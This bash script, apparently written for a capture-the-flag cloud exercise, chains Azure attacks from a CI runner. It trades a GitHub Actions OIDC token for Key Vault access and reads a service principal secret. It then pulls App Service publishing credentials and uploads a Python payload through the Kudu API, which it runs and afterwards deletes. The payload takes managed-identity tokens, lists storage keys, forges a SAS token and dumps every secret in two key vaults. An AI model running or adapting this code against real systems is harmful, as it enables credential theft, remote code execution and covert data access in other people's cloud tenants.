#!/usr/bin/env bash
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
SCM="https://$APPR.scm.azurewebsites.net"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
KVP=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
RS=$(curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
RA=$(echo "$RS"|jq -r .appId); RK=$(echo "$RS"|jq -r .clientSecret)
MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$RA" -d grant_type=client_credentials -d "client_secret=$RK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/publishingcredentials/list?api-version=2023-12-01" > /tmp/pc.json
U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')
for i in 1 2 3 4 5 6; do C=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -H "Authorization: Basic $BA" "$SCM/api/settings"); echo "scm warm $i: $C"; [ "$C" = "200" ] && break; sleep 5; done
# decode exploit in the CI runner (reliable), upload via VFS to /home (outside wwwroot)
cat > /tmp/mf.py <<'PYEOF'
import os,json,urllib.request,urllib.parse,base64,hmac,hashlib,re
ie=os.environ.get("IDENTITY_ENDPOINT",""); ih=os.environ.get("IDENTITY_HEADER","")
CID="7a85156a-01c4-4e61-8472-40a92107159b"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; RG="rg-tbl-platform-prod-sea"; ACC="sttblappcfgprodx3euoz"
def tok(res):
    u=ie+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+CID
    try: return json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih}),timeout=25).read()).get("access_token","")
    except Exception as e:
        try: return "ERR:"+e.read().decode()[:150]
        except: return "ERR:"+str(e)[:150]
def req(u,h,method="GET",data=None):
    try:
        r=urllib.request.Request(u,headers=h,method=method,data=data)
        return urllib.request.urlopen(r,timeout=25).read().decode("utf-8","replace")
    except Exception as e:
        try: return "ERR%s:%s"%(getattr(e,'code','?'),e.read().decode("utf-8","replace")[:300])
        except: return "ERR:"+str(e)[:200]
OUT={"ie_present":bool(ie),"ih_len":len(ih)}
OUT["envflag"]=[ (k,v) for k,v in os.environ.items() if "DF26{" in str(v) ]
# 1) storage data-plane direct blob read
st=tok("https://storage.azure.com/"); OUT["st"]=st[:12]
if st and not st.startswith("ERR"):
    OUT["blob_direct"]=req("https://%s.blob.core.windows.net/config/internal-config.json"%ACC,{"Authorization":"Bearer "+st,"x-ms-version":"2021-08-06"})[:800]
    OUT["containers"]=re.findall(r"<Name>([^<]+)</Name>", req("https://%s.blob.core.windows.net/?comp=list"%ACC,{"Authorization":"Bearer "+st,"x-ms-version":"2021-08-06"}))
# 2) management listKeys -> SAS -> blob
mg=tok("https://management.azure.com/"); OUT["mg"]=mg[:12]
if mg and not mg.startswith("ERR"):
    kr=req("https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-05-01"%(SUB,RG,ACC),{"Authorization":"Bearer "+mg,"Content-Length":"0"},"POST")
    try: key=json.loads(kr)["keys"][0]["value"]; OUT["listKeys"]="OK"
    except Exception: key=None; OUT["listKeys"]=kr[:200]
    if key:
        sv="2021-08-06"; sts="\n".join([ACC,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
        sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
        sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
        OUT["cfg_blobs"]=re.findall(r"<Name>([^<]+)</Name>", req("https://%s.blob.core.windows.net/config?restype=container&comp=list&%s"%(ACC,sas),{}))
        OUT["internal_config"]=req("https://%s.blob.core.windows.net/config/internal-config.json?%s"%(ACC,sas),{})[:800]
# 3) vault -> kv-tbl-sec + kv-tbl-prod
vt=tok("https://vault.azure.net/"); OUT["vt"]=vt[:12]
if vt and not vt.startswith("ERR"):
    for kv in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
        d=req("https://%s.vault.azure.net/secrets?api-version=7.4"%kv,{"Authorization":"Bearer "+vt})
        try:
            ids=[s["id"] for s in json.loads(d).get("value",[])]; OUT[kv]=ids
            for i in ids:
                OUT[kv+"::"+i.split("/")[-1]]=req(i+"?api-version=7.4",{"Authorization":"Bearer "+vt})[:300]
        except Exception: OUT[kv]=d[:200]
print("TBLRESULT="+json.dumps(OUT))
PYEOF
echo "mf.py lines: $(wc -l < /tmp/mf.py)"
echo "VFS PUT -> $(curl -s -o /dev/null -w '%{http_code}' -X PUT --data-binary @/tmp/mf.py -H "If-Match: *" -H "Authorization: Basic $BA" "$SCM/api/vfs/site/wwwroot/zzcl_mf.py")"
echo "### run it"
RESP=$(curl -s -m 110 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command" -d '{"command":"python3 zzcl_mf.py","dir":"site/wwwroot"}')
echo "$RESP" | jq -r '.Output' 2>/dev/null | grep -aoE 'TBLRESULT=.*' | head -1 > /tmp/res.txt
if [ -s /tmp/res.txt ]; then echo "GOT RESULT:"; cat /tmp/res.txt; else echo "no TBLRESULT; raw:"; echo "$RESP" | jq -r '{ExitCode,Error,Output}' 2>/dev/null | head -c 1500; fi
# cleanup
curl -s -o /dev/null -w 'VFS DELETE -> %{http_code}\n' -X DELETE -H "If-Match: *" -H "Authorization: Basic $BA" "$SCM/api/vfs/site/wwwroot/zzcl_mf.py"
echo "=== DONE ==="
